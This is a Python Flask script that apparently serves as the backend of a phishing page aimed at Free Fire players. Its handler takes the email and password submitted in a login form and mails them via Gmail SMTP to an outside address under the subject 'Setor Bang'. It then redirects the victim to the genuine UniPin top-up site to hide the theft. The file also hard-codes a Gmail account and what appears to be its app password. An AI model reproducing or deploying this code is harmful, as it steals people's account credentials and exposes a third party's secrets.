from flask import Flask, request, render_template, redirect
import smtplib

app = Flask("Fanda")

def sender(email, password):
	try:
		message = f"Subject: Setor Bang \n\nEmail: {email}\nPassword: {password}"
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login("jihannabila1821@gmail.com", "wrrbncylhesdpvun")
		server.sendmail("jihannabila1821@gmail.com", "gustigreenn123@gmail.com", message)
		server.quit()
	except:
		pass

@app.route("/", methods=["GET","POST"])
def gasken():
	if request.method == "POST":
		try:
			email = request.form["email"]
			password = request.form["pass"]
			if email.replace(" ","") != "" and password.replace(" ","") != "":
				sender(email, password)
				return redirect("https://www.unipin.com/id/garena/free-fire", code=302)
			else:
				return render_template("view_1.html")
		except Exception as e:
			return render_template("view_2.html")
	return render_template("view_2.html")
